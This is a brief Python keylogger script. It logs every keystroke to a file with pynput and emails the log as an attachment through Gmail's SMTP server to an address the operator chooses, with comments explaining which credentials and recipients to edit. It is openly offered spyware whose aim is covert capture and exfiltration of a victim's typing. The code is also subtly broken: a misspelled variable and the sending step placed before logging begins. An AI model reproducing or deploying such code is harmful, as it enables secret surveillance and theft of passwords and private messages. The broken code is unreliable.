from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import array as arr

#this is part of the keylogger
log_dir = ""#here you can change where to save the log

logging.basicConfig(filename=(log_dir + 'logoftheday.txt'), #this is for the name of the file
level=logging.DEBUG, format='%(asctime)s: %(message)s') #this is how it is going to look in the log 'time : press'
#to here

#this is for sending the logs
##all you have to edit 
email_user = 'from_email' #sender email  
email_password = 'password' # sender password
email_send = "to_email" #you can add multiple receivers!!
##
ssubject = 'log of the last updata'#this is for the subject

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'last updata!' # you can change the message here
msg.attach(MIMEText(body,'plain'))

filename ='logoftheday.txt'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()
#to here


#here starts the keylogger
def on_press(key):
    logging.info (str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
